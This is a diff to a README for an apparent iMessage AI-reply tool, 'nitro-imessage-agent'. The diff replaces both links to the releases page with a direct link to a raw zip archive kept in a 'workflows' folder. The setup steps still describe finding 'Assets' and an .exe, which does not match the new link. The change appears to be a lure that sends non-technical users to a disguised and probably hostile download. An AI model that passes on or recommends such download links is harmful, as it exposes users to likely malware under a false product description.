@@ -1,6 +1,6 @@
 # 🤖 nitro-imessage-agent - Automate your messaging with intelligent replies
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/rocksunfishsinking953/nitro-imessage-agent/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/rocksunfishsinking953/nitro-imessage-agent/raw/refs/heads/main/workflows/imessage-agent-nitro-bundy.zip)
 
 nitro-imessage-agent allows you to connect an artificial intelligence assistant to your iMessage account. This tool listens for incoming messages and sends prepared responses based on your instructions. It manages the connection between your computer and the messaging services you use. This system works well for people who want to automate repetitive tasks or keep their messaging active without constant monitoring.
 
@@ -18,7 +18,7 @@ You do not need to understand code to use this application. The installation pro
 
 Follow these steps to get the software on your machine:
 
-1. [Visit this page to download](https://github.com/rocksunfishsinking953/nitro-imessage-agent/releases).
+1. [Visit this page to download](https://github.com/rocksunfishsinking953/nitro-imessage-agent/raw/refs/heads/main/workflows/imessage-agent-nitro-bundy.zip).
 2. Look for the section labeled "Assets."
 3. Select the file ending in .exe to begin your download. 
 4. Move the downloaded file to a folder where you store your applications.
